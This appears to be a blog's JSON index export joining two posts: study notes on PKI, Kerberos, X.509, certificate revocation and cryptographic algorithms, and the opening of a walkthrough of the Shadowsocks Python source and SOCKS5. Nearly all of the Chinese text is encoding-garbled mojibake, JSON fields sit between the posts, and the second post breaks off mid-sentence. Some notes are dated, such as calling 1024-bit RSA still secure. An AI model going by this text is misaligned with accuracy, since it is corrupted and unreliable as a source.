è®¤è¯ åŠ å¯†    ä¸»è¦é—®é¢˜  Distributing keys(åˆ†å‘å¯†é’¥)  è·å–å…¶ä»–äººçš„å…¬é’¥ åˆ†å‘è‡ªå·±çš„å…¬é’¥   Establishing a shared key with another party(ä¸å¦ä¸€æ–¹å»ºç«‹å…±äº«å¯†é’¥)  ä¿å¯†æ€§ è®¤è¯æ€§   Key storage  å®‰å…¨å­˜å‚¨å¯†é’¥   Revocation  Revoking published keysï¼šæ’¤é”€å…¬é’¥ Determining whether a published key is still validï¼šéªŒè¯å…¬é’¥çš„å¯ç”¨æ€§    Key Lifetime and Key Compromise å…¬é’¥æœ‰ç€æ›´é•¿çš„ç”Ÿå‘½å‘¨æœŸ(decades)\nç§é’¥æˆ–è€…ä¼ ç»Ÿå¯†é’¥æœ‰ç€æ›´çŸ­çš„ç”Ÿå‘½å‘¨æœŸ(a year or two)\nKey Distribution Problem ï¼ä¸­é—´äººæ”»å‡»\nè§£å†³åŠæ³•ï¼šCAï¼ˆCertification authorityï¼‰\n å¯¹ç§°åŠ å¯†å¯†é’¥ç®¡ç†è®¤è¯ï¼šKDC/KEY DISTRIBUTION CENTER éå¯¹ç§°åŠ å¯†å¯†é’¥ç®¡ç†è®¤è¯ï¼šCA/CERTIFICATE AUTHORITY  Data Format ä¸€ç§æ­£ç¡®çš„åŠ å¯†å†…å®¹çš„æ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤º\nPGPå’ŒS/MIMEï¼ŒSSLï¼ŒSSHçš„æ ¼å¼ä¸åŒäºä»–ä»¬çš„ bit-bagging format\nSecurity Protocolï¼šLayers å±‚æ¬¡è¶Šé«˜ï¼Œå°±è¶Šå®¹æ˜“éƒ¨ç½²åº”ç”¨ï¼›å±‚æ¬¡è¶Šä½ï¼Œæ•°æ®å°±è¶Šé€æ˜\nPKIï¼ˆPublic Key Infrastructureï¼‰ Internetå®‰å…¨ç³»ç»Ÿè§£å†³æ–¹æ¡ˆï¼ŒPKIé‡‡ç”¨æ•°å­—è¯ä¹¦æœºåˆ¶ç®¡ç†å…¬é’¥ï¼Œé€šè¿‡ç¬¬ä¸‰æ–¹å¯ä¿¡æœºæ„CAï¼ŒæŠŠç”¨æˆ·çš„å…¬é’¥å’Œèº«ä»½ä¿¡æ¯è¿›è¡Œæœ‰æ•ˆæ†ç»‘ï¼Œåœ¨Internetä¸Šæœ‰æ•ˆéªŒè¯ç”¨æˆ·çš„èº«ä»½\nå›½é™…æ ‡å‡†PKIXï¼šç³»ç»ŸåŒ–ã€æ ‡å‡†åŒ–\nPKIXç³»åˆ—æ ‡å‡†(Public Key Infrastructure on X.509)æ˜¯ç”±å› ç‰¹ç½‘ç½‘ç»œå·¥ç¨‹æŠ€æœ¯å°ç»„çš„PKIå°ç»„åˆ¶å®šï¼ŒPKIXçš„æ ‡å‡†åŒ–æ˜¯å»ºç«‹äº’æ“ä½œçš„åŸºç¡€ã€‚æ ‡å‡†ä¸»è¦å®šä¹‰åŸºäºX.509çš„PKIæ¡†æ¶æ¨¡å‹ï¼Œå¹¶ä»¥RFCå½¢å¼å‘å¸ƒ\n å®‰å…¨ï¼šå¯é æ€§==ã€‹å¯é æ€§ï¼ˆç½‘è¯¾çš„å¯é æ€§å’Œå®‰å…¨æ€§ï¼Œæ²¡æœ‰å¯é æ€§ï¼Œå®‰å…¨æ€§æ²¡ç”¨ï¼‰\nå®‰å…¨åè®®ä¸æ ‡å‡†\nåè®®ï¼šè‡³å°‘ä¸¤æ–¹å‚ä¸\nç½‘ç»œåè®®çš„ä¸‰è¦ç´ ï¼šè¯­æ³•ã€è¯­ä¹‰ã€åŒæ­¥\nå›´ç»•PKIçš„ç›¸å…³åè®®å’Œç†è®º\nPKIï¼šå®‰å…¨åŸºç¡€è®¾æ–½ï¼šPublic Key Infrastructure\n åŸºç¡€è®¾æ–½åè®® åº”ç”¨çš„åè®®   å‚è€ƒä¹¦ï¼š\nPKIæŠ€æœ¯ï¼Œè†ç»§æ­¦ï¼Œå†¯ç™»å›½ï¼Œç§‘å­¦å‡ºç‰ˆç¤¾ï¼ˆåç†è®º\nPKIåŸç†ä¸æŠ€æœ¯ï¼Œè°¢å†¬é’ï¼Œæ¸…åå¤§å­¦å‡ºç‰ˆç¤¾\nPKI/CAä¸æ•°å­—è¯ä¹¦æŠ€æœ¯å¤§å…¨ï¼Œå¼ æ˜å¾·ï¼Œåˆ˜ä¼Ÿï¼Œç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾ï¼ˆåå®è·µ\n  å¯é æ€§å’Œå®‰å…¨æ€§çš„åŒºåˆ«ï¼Œå…¶ä¸¤è€…ä¹‹é—´çš„åŒ…å«æ€§\né¢å¯¹é—®é¢˜éœ€è¦ç³»ç»Ÿçš„æ–¹æ³•\n   ç¯å¢ƒå®‰å…¨\n  ç‰©ç†å®‰å…¨\n  ç‰©ç†ç½‘è·¯\n  å¹³å°å¯é æ€§\n   å®‰å…¨â€”â€”æœ¨æ¡¶ç†è®º\nå®‰å…¨ï¼šç”Ÿæ€çš„æ¦‚å¿µ\nè´è¶æ•ˆåº”\né»‘å¤©é¹…ç†è®º\nCIAä¸‰å®šç†\nè¢«åŠ¨æ”»å‡»\u0026ä¸»åŠ¨æ”»å‡»\n è¢«åŠ¨æ”»å‡»ï¼šå¯ä»¥ç›‘æ§æ•°æ® ä¸»åŠ¨æ”»å‡»ï¼šå¯ä»¥ä¿®æ”¹æ•°æ®  å±æ€§è¯ä¹¦\nèº«ä»½è¯ä¹¦\nä¸¤è€…ç»“åˆè§£å†³èº«ä»½è®¤è¯é—®é¢˜\nåè®®ï¼šè‡³å°‘ä¸¤æ–¹ï¼Œäº¤äº’ä¿¡æ¯ã€æœ‰é™äº¤äº’\næ€ä¹ˆæ‰“padding\n å…¬é’¥ç®—æ³•çš„åŠŸèƒ½\n  åŠ è§£å¯†ï¼šä¿å¯†æ€§\n  æ•°å­—ç­¾åï¼šè®¤è¯æ€§\n  å¯†é’¥äº¤æ¢ï¼šå¯†é’¥ç®¡ç†\n  RSAï¼šæ•°å­—ç­¾ååŠ è§£å¯†\n  DHï¼šå¯†é’¥äº¤æ¢\n  Elgamal\n  DSAï¼šåŸºäºç¦»æ•£å¯¹æ•°çš„\n  æ¤­åœ†æ›²çº¿\n   IPV4ï¼Œç½‘ç»œä½å±‚æ²¡æœ‰è€ƒè™‘å®‰å…¨\næˆ‘å›½IPv4çš„åœ°å€åŒ®ä¹ï¼Œä¸»ç½‘æ¨¡å¼ä¸‹å¤§é‡NATã€å†…ç½‘ç©¿é€çš„ä½¿ç”¨ï¼Œå¤§åŠ›æ¨å¹¿IPV6\nPKIï¼šPublic Key Instruction\nå¯†ç å­¦äº”å¤§å¥ åŸºï¼š\n å¯¹ç§°å¯†ç  å…¬é’¥åŠ å¯† æ•°å­—ç­¾å HASH MAC  åè®®ï¼šç½‘ç»œåè®®\u0026åº”ç”¨åè®®\næŠ¥å‘Šï¼šä¸­å›½PKIæŠ€æœ¯å’Œåº”ç”¨å‘å±•ï¼Œè°ƒç ”\nç½‘ç«™å­¦ä¹ ï¼šæŠ€æœ¯ä½“æœ¯æ ‡å‡†åŒ–ï¼Œå•†å¯†SMç³»åˆ—æ ‡å‡†\næŠ¥å‘Šï¼šç»¼è¿°ã€æ¶‰åŠäº†ä»€ä¹ˆ\nddl:10day\n ç½‘ç»œå®‰å…¨åŸºç¡€è®¾æ–½  æä¾›ç½‘ç»œå®‰å…¨åŸºæœ¬æ¡†æ¶ï¼Œå¯ä»¥è¢«ç»„ç»‡å†…ä»»ä½•éœ€è¦å®‰å…¨æœåŠ¡çš„åº”ç”¨å’Œå¯¹è±¡ä½¿ç”¨ æ¥å…¥ç‚¹ç»Ÿä¸€çš„ï¼Œä¾¿äºä½¿ç”¨  å®‰å…¨ç™»å½•ï¼ˆè®¤è¯ï¼‰ è®¤è¯ï¼šç¡®è®¤ä¸€ä¸ªå®ä½“ç¡®å®æ˜¯å…¶å‘å…¶ä»–äººå£°æ˜çš„\nç”¨æˆ·æ ‡è¯†\u0026è®¤è¯ä¿¡æ¯\u0026é˜²æ­¢å£ä»¤æˆªå–\u0026ç›‘å¬\u0026é‡æ”¾æ”»å‡»\né€‰æ‹©å¥½å£ä»¤ï¼šé•¿åº¦ï¼Œè´¨é‡ï¼Œç»å¸¸ä¿®æ”¹\nå£ä»¤ä¸å†ç½‘ç»œä¸Šç›´æ¥ä¼ è¾“\n   è®¤è¯ï¼š â‘ Kerboerosï¼šçº¯å¯†ç  åŸºäºç”¨æˆ·å/å£ä»¤ â‘¡æ•°å­—è¯ä¹¦\n  æˆæƒï¼šæ˜¯ä¸€ä¸ªè®¿é—®æ§åˆ¶é—®é¢˜ å¯¹èµ„æºæ§åˆ¶\n   Kerberos\n X.509 Certificate æ•°å­—è¯ä¹¦çš„åˆæ³•æœ‰æ•ˆæ€§éªŒè¯åŒ…å«\n ç­¾åéªŒè¯ï¼šè‡ªç­¾åè¯ä¹¦  ...\n è¯ä¹¦é“¾   PKIæœåŠ¡çš„çªå‡ºä¼˜åŠ¿  èŠ‚çœè´¹ç”¨ ä¼ä¸šå†…éƒ¨äº’æ“ä½œæ€§\u0026ä¼ä¸šé—´äº’æ“ä½œæ€§ ä¸€è‡´çš„è§£é‡Šæ–¹æ¡ˆï¼ˆå…¼å®¹æ€§ï¼‰ å®é™…å®‰å…¨æ€§ï¼ˆæ ‡å‡†åŒ–\u0026æˆç†Ÿæ€§ï¼‰ å®‰å…¨æœåŠ¡æä¾›è€…çš„é€‰æ‹©ï¼ˆå¯åº¦é‡\u0026å¯é æ€§\u0026è®¤è¯ç®¡ç†ï¼‰   PKIæœåŠ¡çš„ä¸å¯å¦è®¤æ€§å®ç°\n æ•°å­—ç­¾å+æ—¶é—´æˆ³æœåŠ¡ è¯æ®ï¼ˆåŸå§‹æ•°æ®+ç­¾åä¿¡æ¯+å¯†é’¥+æ—¶é—´æˆ³ï¼‰  PKI Architecture PKIæ¶æ„\nApplicationï¼šå¸¸è§„ç³»ç»Ÿè½¯ä»¶ï¼Œå¦‚æ•°æ®åº“ã€æ“ä½œç³»ç»Ÿã€Webserver\nç»“åˆç½‘ç»œçš„åˆ†å±‚ç»“æ„\nå¯ä»¥å±‚å±‚å åŠ çš„\nCryptographic Primitivesï¼šä»£ç ç­¾åï¼šCSPï¼ŒMicrosoft CryptoAPI 2.0\n PKCS#æ ‡å‡†åˆ—è¡¨\n è¯¾ç¨‹å¤ä¹ æ€»ç»“\n  å¯†ç åŸºç¡€çŸ¥è¯†éƒ¨åˆ†   å®‰å…¨éœ€æ±‚ï¼šäº”æ–¹é¢ï¼šConfidentiality Integrity Authentication Non-repudiation Access_Control\nå¯†ç ç®—æ³•â€”â€”ä¸Šå‡åˆ°â€”â€”åè®®\nå¯†ç ç®—æ³•ä¸åè®®çš„å±‚æ¬¡å…³ç³»\nå¯†ç ç®—æ³•ï¼šæœºåˆ¶ï¼ˆåŠ å¯†æœºåˆ¶ï¼ˆå¯¹ç§°åŠ å¯†æœºåˆ¶ã€å…¬é’¥åŠ å¯†æœºåˆ¶ã€å¤å…¸å¯†ç æœºåˆ¶ï¼‰ï¼‰\nç®—æ³•ï¼šé€¼è¿«è®¡ç®—ç ´è§£\n   å¯¹ç§°åŠ å¯†ï¼šä»£æ›¿\u0026ç½®æ¢\n DESï¼š  DES-\u003eAESçš„æ¼”åŒ–ï¼šæ•ˆç‡çš„è¿›åŒ– å®‰å…¨æ€§ä¸»è¦é›†ä¸­åœ¨ï¼šå¯†é’¥é•¿åº¦è¿‡çŸ­2^56 æœ‰æ”»å‡»æ‰‹æ®µ   AESï¼š  2^128 ã€2^256ï¼Œå¯å˜      å…¬é’¥åŠ å¯†\n RSA  1024bitè¿˜æ˜¯å®‰å…¨çš„ 1024-N=p*q   ECC  éœ€è¦çš„å¯†é’¥æ›´çŸ­ï¼Œå®‰å…¨æ€§æ›´å¼ºï¼ˆ160bitå¯†é’¥è¾¾åˆ°1024bit rsaçš„å®‰å…¨æ€§ï¼‰       åŒºåˆ«\n å…¬é’¥åŠ å¯†åŸºäºå›°éš¾é—®é¢˜ï¼Œå…·å¤‡ç†è®ºå®‰å…¨ é‡å­è®¡ç®—ï¼šè®¡ç®—å¤æ‚ï¼Œå‡å°‘æŒ‡æ•°çº§å¤æ‚åº¦ å†¯è¯ºä¾æ›¼è®¡ç®—æœºç»“æ„ï¼šè§£å†³å¤šé¡¹å¼ç®—æ³•çš„é—®é¢˜ ç‰¹ç‚¹æ¯”è¾ƒï¼Œå†³å®šä½¿ç”¨ç¯å¢ƒä¸åŒ     æ•°å­—ç­¾åï¼ŒåŸç†\nå“ˆå¸Œå‡½æ•°ï¼ŒMACå‡½æ•°ï¼ˆå¸¦æœ‰å¯†é’¥çš„å“ˆå¸Œå‡½æ•°ï¼‰ï¼šå¸¸è§„åº”ç”¨åŠŸèƒ½\nåè®®ï¼šè§£å†³å®é™…åº”ç”¨çš„æŸäº›é—®é¢˜\nåè®®å’Œç®—æ³•çš„åŒºåˆ«ï¼Œåè®®ï¼šä¸¤æ–¹ã€å¤šæ–¹åè°ƒé€šä¿¡ï¼Œç®—æ³•ï¼šä¸€æ–¹\nSSLåè®®\nå¯†é’¥ç®¡ç†é—®é¢˜ï¼šKey Distribution\n Kerbers åè®®ï¼š  åè®®æå‡ºèƒŒæ™¯ åè®®çš„æ ¸å¿ƒæŠ€æœ¯ï¼šå£ä»¤ã€å®Œå…¨é‡‡ç”¨å¯¹ç§°åŠ å¯† é›†æˆçš„å®‰å…¨åº”ç”¨çš„å®‰å…¨éœ€æ±‚ï¼Œè§£å†³äº†ä»€ä¹ˆéœ€æ±‚ SSOå•ç‚¹ç™»é™†ï¼šè§£å†³ä¿¡æ¯å­¤å²›ã€è®¿é—®æ§åˆ¶é—®é¢˜ å¦‚ä½•è§£å†³ä¸‰ä¸ªå±‚æ¬¡ï¼šTGSã€åº”ç”¨æœåŠ¡å™¨ã€ç”¨æˆ· ç¥¨æ®ï¼šå¯¹ç§°åŠ å¯† ä¿è¯ç¥¨æ®å®‰å…¨ï¼šä¸ä¼šè¢«é‡æ”¾ è®¤è¯å­ï¼Œè®¤è¯å…ƒç´  æ•ˆç‡ã€æ–¹ä¾¿æ€§ç›¸å…³ï¼š å¤šä¸ªåè®®ç¯ï¼šå‡å°‘è®¤è¯æœåŠ¡å™¨çš„å‹åŠ›ã€é›†ä¸­å¼å˜åˆ†å¸ƒå¼    å¯†é’¥åå•†æœºåˆ¶ï¼Œè§£å†³å¯¹ç§°ç®—æ³•å¯†é’¥äº¤æ¢é—®é¢˜ï¼ˆKey Agreementï¼‰\nå…¬é’¥æ•°å­—è¯ä¹¦\nX509è¯ä¹¦è§„èŒƒ\næ•°å­—è¯ä¹¦è‡ªèº«çš„éªŒè¯\nCRLçš„æ„é€ åŸç†ï¼šå‘¨æœŸæ€§çš„\nOCSPåè®®å·¥ä½œåŸç†ï¼šæœ‰æ•ˆæ€§å’Œå®‰å…¨æ€§\nè¯ä¹¦åŠé”€\nCRLå’ŒOCSPçš„å¯¹æ¯”ã€å®‰å…¨é£é™©ï¼ˆåœ¨å“ªï¼Œæ€ä¹ˆå¼¥è¡¥ï¼‰\nå®‰å…¨æœåŠ¡\nè¯ä¹¦ç®¡ç†æœåŠ¡ï¼š\nPKIæ¡†æ¶ï¼šæœ‰ä»€ä¹ˆç”¨ã€è§£å†³å•¥é—®é¢˜\nCAæ¶æ„\nå±æ€§è¯ä¹¦\nPKIæ¶æ„å›¾\nPKIç³»ç»Ÿç»“æ„ç»„æˆ\nCAè®¤è¯ç»“æ„â€”â€”ä¿¡ä»»æ¨¡å‹\nç¼–ç é—®é¢˜ï¼š\næŠ½è±¡è¯­æ³•æ³¨è§£ï¼šASN.1ï¼ˆæ— äºŒä¹‰æ€§ï¼‰\nDERç¼–ç ï¼šåŸºæœ¬è§„åˆ™**ï¼Œèƒ½ç¼–ç è§£ç **\nä¿¡ä»»æ¨¡å‹ï¼šåŸºäºCAã€æ•°å­—è¯ä¹¦è®¤è¯ä¸­å¿ƒçš„æ¨¡å‹\nPKCSæ ‡å‡†åˆ—è¡¨\næ•°å­—ä¿¡å°\nCPå’ŒCPSçš„å…³ç³»\nKerberos\nSSL/TLS\nIPSEC\nPGP\n","description":"","tags":["studyNote"],"title":"Security-Protocols-and-Standards","uri":"/posts/security-protocols-and-standards/"},{"categories":["web"],"content":"å…³äºShadowSocksçš„å­¦ä¹  å¯¹å¾…ç§‘å­¦ä¸Šç½‘çš„å·¥å…·ï¼Œæ—¢ç„¶å¼€æºçš„è¯ï¼Œå°±è¦æœ‰ç§‘å­¦çš„ç²¾ç¥å¯¹å…¶è¿›è¡Œå­¦ä¹ ã€‚\nå…¶GitHubå®˜æ–¹ç½‘å€ï¼šhttps://github.com/shadowsocks\næœ¬æ–‡å­¦ä¹ çš„æºç æ¥è‡ªï¼šhttps://github.com/shadowsocks/shadowsocks\nç‰ˆæœ¬æ˜¯2.9.1çš„pythonç‰ˆæœ¬\n å‚è€ƒï¼š\nshadowsocks æºç åˆ†æï¼šæ•´ä½“ç»“æ„\nä½ ä¹Ÿèƒ½å†™ä¸ª Shadowsocks\nshadowsocksæºç åˆ†æï¼šssserver\nshadowsocks æºç é˜…è¯»\nShadowsocks æºç åˆ†æâ€”â€”åè®®ä¸ç»“æ„\nshadowsockså®¢æˆ·ç«¯æºç åˆ†æ\n è¿™ä¸ªä¸–ç•Œä¸Šä¸åº”è¯¥ä»…æœ‰ä¸€ç§å£°éŸ³ã€‚\nä½†æ˜¯ã€‚ã€‚ã€‚\nå…³äºSOCKSåè®® ShadowSocksçš„æ•°æ®ä¼ è¾“æ—¶å»ºç«‹åœ¨SOCK5åè®®ä¹‹ä¸Šï¼ŒSOCKS5 æ˜¯ TCP/IP å±‚é¢çš„ç½‘ç»œä»£ç†åè®®ã€‚\nss-server ç«¯è§£å¯†å‡ºæ¥çš„æ•°æ®å°±æ˜¯é‡‡ç”¨ SOCKS5 åè®®å°è£…çš„ï¼Œé€šè¿‡ SOCKS5 åè®® ss-server ç«¯èƒ½è¯»å‡ºæœ¬æœºè½¯ä»¶æƒ³è®¿é—®çš„æœåŠ¡çš„çœŸæ­£åœ°å€ä»¥åŠè¦ä¼ è¾“çš„åŸæ•°æ®\n å…³äºSocks5å­¦ä¹ ï¼š\nsocks5 åè®®ç®€ä»‹\nHTTPåè®®å’ŒSOCKS5åè®®\nsocks-wiki\nrfc1928\nrfc1929\n socksæ˜¯ä¸€ç§ç½‘ç»œä¼ è¾“åè®®ï¼Œä¸»è¦ç”¨äºå®¢æˆ·ç«¯ä¸å¤–ç½‘æœåŠ¡å™¨ä¹‹é—´é€šè®¯çš„ä¸­é—´ä¼ é€’ã€‚æ ¹æ®OSIä¸ƒå±‚æ¨¡å‹æ¥åˆ’åˆ†ï¼ŒSOCKSå±äºä¼šè¯å±‚åè®®ï¼Œä½äºè¡¨ç¤ºå±‚ä¸ä¼ è¾“å±‚ä¹‹é—´ã€‚\nsocks5åè®®å°†socks4åè®®æ‰©å±•ï¼š\n å¯¹UDPè¿æ¥çš„æ”¯æŒ å¤šç§ç”¨æˆ·èº«ä»½éªŒè¯æ–¹å¼å’Œé€šä¿¡åŠ å¯†æ–¹å¼ å°†å¯»å€æ–¹å¼æ‰©å±•ä¸ºåŒ…å«åŸŸåå’Œv6 IPåœ°å€ï¼ˆå³IPv6ï¼‰  socksåè®®çš„è®¾è®¡åˆè¡·æ˜¯åœ¨ä¿è¯ç½‘ç»œéš”ç¦»çš„æƒ…å†µä¸‹ï¼Œæé«˜éƒ¨åˆ†äººå‘˜çš„ç½‘ç»œè®¿é—®æƒé™ã€‚ä½†æ˜¯ä»–å´è¢«å‘ç°äº†æ–°çš„ç”¨é€”ï¼šçªç ´ç½‘ç»œé€šä¿¡é™åˆ¶ï¼Œè¿™å’Œè¯¥åè®®çš„è®¾è®¡åˆè¡·æ­£å¥½ç›¸åã€‚\nSocks5åè®®æµç¨‹ å»ºç«‹TCPè¿æ¥åï¼Œå®¢æˆ·ç«¯éœ€è¦å…ˆå‘é€è¯·æ±‚æ¥åå•†ç‰ˆæœ¬åŠè®¤è¯æ–¹å¼ï¼Œè¯¦ç»†å¯è§rfc1928\nShadowsocksåŸç†  PCæ˜¯éœ€è¦åˆ©ç”¨shadowsocksä»£ç†çš„åº”ç”¨ï¼› SS Localï¼šä¸ºshadowsockså®¢æˆ·ç«¯ï¼Œé€šå¸¸è¿è¡Œåœ¨PC/æ‰‹æœºä¸Šï¼ˆä¹Ÿå¯ä»¥è¿è¡Œåœ¨ä»»åŠ¡PCå¯ ä»¥åˆ°è¾¾çš„ä½ç½®ï¼‰ï¼Œç”¨äºä¸shadowsocksæœåŠ¡ç«¯å»ºç«‹è¿æ¥ã€‚ GFWï¼šä½ æ‡‚çš„ ss serverï¼šshadowsocksæœåŠ¡ç«¯ï¼Œä¸ss localé€šè®¯ï¼Œå®Œæˆss localè¯· æ±‚çš„è®¿é—®ï¼Œå¹¶å°†è¿”å›æ•°æ®åŠ å¯†è¿”å›ç»™ss local  æ··æ·†æ—¶å®åœ¨ClientHelloé˜¶æ®µï¼Œå³ç¬¬1é˜¶æ®µæ—¶è¿›è¡Œæ··æ·†ï¼ŒåŠ å…¥jiadeç›®æ ‡ç½‘å€\nshadowsocksæºç åˆ†æ shadowsocksæ–‡ä»¶æ ‘å½¢ç»“æ„å›¾å¦‚ä¸‹\n â”œâ”€â”€ .gitignore â”œâ”€â”€ .travis.yml â”œâ”€â”€ CHANGES â”œâ”€â”€ CONTRIBUTING.md â”œâ”€â”€ debian â”‚ â”œâ”€â”€ changelog â”‚ â”œâ”€â”€ compat â”‚ â”œâ”€â”€ config.json â”‚ â”œâ”€â”€ control â”‚ â”œâ”€â”€ copyright â”‚ â”œâ”€â”€ docs â”‚ â”œâ”€â”€ init.d â”‚ â”œâ”€â”€ install â”‚ â”œâ”€â”€ rules â”‚ â”œâ”€â”€ shadowsocks.default â”‚ â”œâ”€â”€ shadowsocks.manpages â”‚ â”œâ”€â”€ source â”‚ â”‚ â””â”€â”€ format â”‚ â”œâ”€â”€ sslocal.1 â”‚ â””â”€â”€ ssserver.1 â”œâ”€â”€ Dockerfile â”œâ”€â”€ LICENSE â”œâ”€â”€ MANIFEST.in â”œâ”€â”€ README.md â”œâ”€â”€ README.rst â”œâ”€â”€ setup.py â”œâ”€â”€ shadowsocks â”‚ â”œâ”€â”€ asyncdns.py â”‚ â”œâ”€â”€ common.py â”‚ â”œâ”€â”€ crypto â”‚ â”‚ â”œâ”€â”€ __init__.py â”‚ â”‚ â”œâ”€â”€ openssl.py â”‚ â”‚ â”œâ”€â”€ rc4_md5.py â”‚ â”‚ â”œâ”€â”€ sodium.py â”‚ â”‚ â”œâ”€â”€ table.py â”‚ â”‚ â””â”€â”€ util.py â”‚ â”œâ”€â”€ daemon.py â”‚ â”œâ”€â”€ encrypt.py â”‚ â”œâ”€â”€ eventloop.py â”‚ â”œâ”€â”€ __init__.py â”‚ â”œâ”€â”€ local.py â”‚ â”œâ”€â”€ lru_cache.py â”‚ â”œâ”€â”€ manager.py â”‚ â”œâ”€â”€ server.py â”‚ â”œâ”€â”€ shell.py â”‚ â”œâ”€â”€ tcprelay.py â”‚ â””â”€â”€ udprelay.py â”œâ”€â”€ tests â”œâ”€tests â”‚ â”œâ”€â”€ aes-cfb1.json â”‚ â”œâ”€â”€ aes-cfb8.json â”‚ â”œâ”€â”€ aes-ctr.json â”‚ â”œâ”€â”€ aes.json â”‚ â”œâ”€â”€ assert.sh â”‚ â”œâ”€â”€ chacha20-ietf.json â”‚ â”œâ”€â”€ chacha20.json â”‚ â”œâ”€â”€ client-multi-server-ip.json â”‚ â”œâ”€â”€ coverage_server.py â”‚ â”œâ”€â”€ fastopen.json â”‚ â”œâ”€â”€ gen_multiple_passwd.py â”‚ â”œâ”€â”€ graceful.json â”‚ â”œâ”€â”€ graceful_cli.py â”‚ â”œâ”€â”€ graceful_server.py â”‚ â”œâ”€â”€ ipv6-client-side.json â”‚ â”œâ”€â”€ ipv6.json â”‚ â”œâ”€â”€ jenkins.sh â”‚ â”œâ”€â”€ nose_plugin.py â”‚ â”œâ”€â”€ rc4-md5-ota.json â”‚ â”œâ”€â”€ rc4-md5.json â”‚ â”œâ”€â”€ salsa20-ctr.json â”‚ â”œâ”€â”€ salsa20.json â”‚ â”œâ”€â”€ server-dnsserver.json â”‚ â”œâ”€â”€ server-multi-passwd-client-side.json â”‚ â”œâ”€â”€ server-multi-passwd-empty.json â”‚ â”œâ”€â”€ server-multi-passwd-performance.json â”‚ â”œâ”€â”€ server-multi-passwd-table.json â”‚ â”œâ”€â”€ server-multi-passwd.json â”‚ â”œâ”€â”€ server-multi-ports.json â”‚ â”œâ”€â”€ setup_tc.sh â”‚ â”œâ”€â”€ table.json â”‚ â”œâ”€â”€ test.py â”‚ â”œâ”€â”€ test_command.sh â”‚ â”œâ”€â”€ test_daemon.sh â”‚ â”œâ”€â”€ test_graceful_restart.sh â”‚ â”œâ”€â”€ test_large_file.sh â”‚ â”œâ”€â”€ test_udp_src.py â”‚ â”œâ”€â”€ test_udp_src.sh â”‚ â”œâ”€â”€ workers.json â”‚ â”‚ â”‚ â”œâ”€libsodium â”‚ â”‚ â””â”€â”€ install.sh â”‚ â”‚ â”‚ â””â”€socksify â”‚ â”œâ”€â”€ install.sh â”‚ â””â”€â”€ socks.conf | â””â”€â”€ utils â”œâ”€â”€ autoban.py â”œâ”€â”€ fail2ban â”‚ â””â”€â”€ shadowsocks.conf â””â”€â”€ README.md æœ‰è¿‡pythonå·¥ç¨‹ç»éªŒï¼ˆç±»ä¼¼äºFlaskï¼‰å¾ˆæ˜æ˜¾å¾—çŸ¥ï¼Œå·¥ç¨‹æ ¸å¿ƒä»£ç ä½äºshadowsocksé‡Œï¼Œå…¶ä»–æä¾›äº†æ‰“åŒ…æµ‹è¯•åŠŸèƒ½ã€‚\nå¯¹äºæ ¸å¿ƒä»£ç ï¼š\nâ”œâ”€â”€ shadowsocks â”‚ â”œâ”€â”€ asyncdns.py â”‚ â”œâ”€â”€ common.py â”‚ â”œâ”€â”€ crypto â”‚ â”‚ â”œâ”€â”€ __init__.py â”‚ â”‚ â”œâ”€â”€ openssl.py â”‚ â”‚ â”œâ”€â”€ rc4_md5.py â”‚ â”‚ â”œâ”€â”€ sodium.py â”‚ â”‚ â”œâ”€â”€ table.py â”‚ â”‚ â””â”€â”€ util.py â”‚ â”œâ”€â”€ daemon.py â”‚ â”œâ”€â”€ encrypt.py â”‚ â”œâ”€â”€ eventloop.py â”‚ â”œâ”€â”€ __init__.py â”‚ â”œâ”€â”€ local.py â”‚ â”œâ”€â”€ lru_cache.py â”‚ â”œâ”€â”€ manager.py â”‚ â”œâ”€â”€ server.py â”‚ â”œâ”€â”€ shell.py â”‚ â”œâ”€â”€ tcprelay.py â”‚ â””â”€â”€ udprelay.py  tcprelay.pyæä¾›äº†ç±»TCPRelay, TCPRelayHandleræ¥å¤„ç†TCPä»£ç†è¿æ¥ udprelay.pyæä¾›äº†ç±»UDPRelayï¼ŒUDPRelayHandleræ¥å¤„ç†UDPä»£ç†è¿æ¥ eventloop.pyæä¾›äº†ç±»EventLoopå¯¹epoll, kqueue, selectæ–¹æ³•çš„åŒ…è£…ï¼Œæä¾›ç»Ÿä¸€çš„IOå¤ç”¨æ¥å£ encrypt.pyæä¾›åŠ å¯†è§£å¯†ç›¸å…³æ¥å£  å…·ä½“çš„åŠ å¯†å®ç°åœ¨cryptoæ–‡ä»¶å¤¹ä¸­å®ç°   daemon.pyï¼šç”¨äºå®ç°å®ˆæŠ¤è¿›ç¨‹ï¼› shell.pyï¼šè¯»å–å‘½ä»¤è¡Œå‚æ•°ï¼Œæ£€æŸ¥é…ç½® common.pyåŒ…å«ä¸€äº›é€šç”¨æ¥å£ lru_cache.pyï¼šå®ç°äº†LRUç¼“å­˜ server.pyæ˜¯æœåŠ¡ç«¯å…¥å£ssserverï¼› local.pyæ˜¯å®¢æˆ·ç«¯å…¥å£sslocalï¼›  å¯ä»¥çœ‹åˆ°ï¼ŒåŸºæœ¬æ¯ä¸ªæ–‡ä»¶ä¸­ï¼Œéƒ½æœ‰è¿™ä¸€è¡Œçš„å¼•å…¥æ¨¡å—\n1 2  from __future__ import absolute_import, division, print_function, \\ with_statement   è¿™ä¸ªæ¨¡å—æ˜¯ä¸ºäº†å¼•å…¥ä¸‹ä¸€ç‰ˆæœ¬çš„pythonç‰¹æ€§ï¼Œæé«˜ä»£ç å¯¹æœ€æ–°pythonç‰ˆæœ¬çš„å…¼å®¹æ€§ã€‚\nåœ¨setup.pyä¸­å¯è§ï¼Œè¯¥ä»£ç å¯åœ¨python2.6ï¼Œpython2.7ä»¥åŠpython3.3ï¼Œpython3.4åŠä»¥ä¸Šç‰ˆæœ¬è¿è¡Œï¼Œå› æ­¤ä¼šå¼•å…¥è¯¥åº“æ¥è§£å†³å…¼å®¹æ€§é—®é¢˜\nä¸»è¦æ˜¯ä¸ºäº†å…¼å®¹import ï¼Œé™¤æ³•/ï¼Œprintï¼Œwith\n  about __future__ï¼š\nhttps://www.liaoxuefeng.com/wiki/897692888725344/923030465280480\n  import  https://blog.csdn.net/caiqiiqi/article/details/51050800\nPython 2.4æˆ–ä¹‹å‰, Pythonä¼šå…ˆæŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹æœ‰æ²¡æœ‰string.py, è‹¥æ‰¾åˆ°äº†ï¼Œåˆ™å¼•å…¥è¯¥æ¨¡å—ï¼Œç„¶åä½ 